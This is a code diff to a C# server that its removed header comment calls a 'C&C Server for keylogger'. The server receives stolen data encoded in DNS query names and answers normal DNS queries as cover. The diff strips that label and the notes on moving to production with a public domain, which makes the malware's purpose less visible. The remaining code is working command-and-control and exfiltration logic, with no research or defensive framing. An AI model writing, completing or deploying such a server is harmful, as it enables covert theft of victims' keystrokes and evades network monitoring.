@@ -6,35 +6,18 @@ using Server.Utilities;
 
 namespace Server.Logic
 {
-    /// <summary>
-    /// Authoritative DNS Server - C&C Server for keylogger
-    /// 
-    /// DEPLOYMENT MODES:
-    /// 
-    /// 1. LOCAL TEST MODE (Current):
-    ///    Client → Directly to this server (127.0.0.1:53)
-    ///    No DNS Resolver needed
-    /// 
-    /// 2. PRODUCTION MODE (Future - with DNS Resolver):
-    ///    Client → DNS Resolver → This server (Authoritative)
-    ///    Requires:
-    ///    - DNS Resolver (BIND/Unbound/Custom)
-    ///    - Domain registration with NS records pointing here
-    ///    - Public IP and proper firewall config
-    /// </summary>
     public class ServerLogic
     {
         private UdpClient? _udpServer;
         private bool _isRunning;
         private string _domain = "example.com";
         private string _serverIp = "127.0.0.1";
-
-        // Modular components
+        
         private ClientManager? _clientManager;
         private ProtocolHandler? _protocolHandler;
         private AuthoritativeDNSHandler? _dnsHandler;
 
-        // Events for UI updates
+
         public event Action<string>? OnLogMessage;
         public event Action<ClientInfo>? OnClientAdded;
         public event Action<int>? OnClientRemoved;
@@ -42,8 +25,6 @@ namespace Server.Logic
         public event Action<int, string>? OnDataReceived;
 
 
-        /// LOCAL TEST: port=53, domain=example.com, serverIp=127.0.0.1
-        /// PRODUCTION: port=53, domain=yourdomain.com, serverIp=PUBLIC_IP
         public void Start(int port, string domain, string logPath, string serverIp = "127.0.0.1")
         {
             if (_isRunning) return;
@@ -54,8 +35,7 @@ namespace Server.Logic
             _clientManager = new ClientManager(logPath);
             _protocolHandler = new ProtocolHandler(_domain);
             _dnsHandler = new AuthoritativeDNSHandler(_domain, _serverIp);
-
-            // Wire up events
+            
             _clientManager.OnClientAdded += (info) => OnClientAdded?.Invoke(info);
             _clientManager.OnClientCountChanged += (count) => OnClientCountChanged?.Invoke(count);
             _protocolHandler.OnDataReceived += (id, data) =>
@@ -131,20 +111,19 @@ namespace Server.Logic
 
                 try
                 {
-                    // Only process A record queries
+
                     if (dnsQuery.QueryType != 1)
                     {
                         throw new UnrelatedException();
                     }
-
-                    // Extract data from query (a.1.1.1 or b.0.5.hexdata)
+                    
                     string extractedData = _protocolHandler.GetData(queryName);
                     string[] parts = extractedData.Split('.', 2);
                     string packetType = parts[0];
 
                     if (packetType == "a")
                     {
-                        // Connection request
+ 
                         LogMessage($"\n[Query] {queryName} from {remoteEP.Address}");
                         LogMessage($"[Connect] Starting connection #{_clientManager.ClientCount + 1}");
 
@@ -155,7 +134,7 @@ namespace Server.Logic
                     }
                     else if (packetType == "b")
                     {
-                        // Data packet
+
                         LogMessage($"\n[Query] {queryName} from {remoteEP.Address}");
                         string rest = parts.Length > 1 ? parts[1] : "";
                         
@@ -177,7 +156,7 @@ namespace Server.Logic
                 }
                 catch (UnrelatedException)
                 {
-                    // Handle normal DNS queries (for production mode)
+
                     LogMessage($"[Normal DNS Query] {queryName}");
                     response = _dnsHandler.HandleQuery(data, dnsQuery, queryName);
                 }
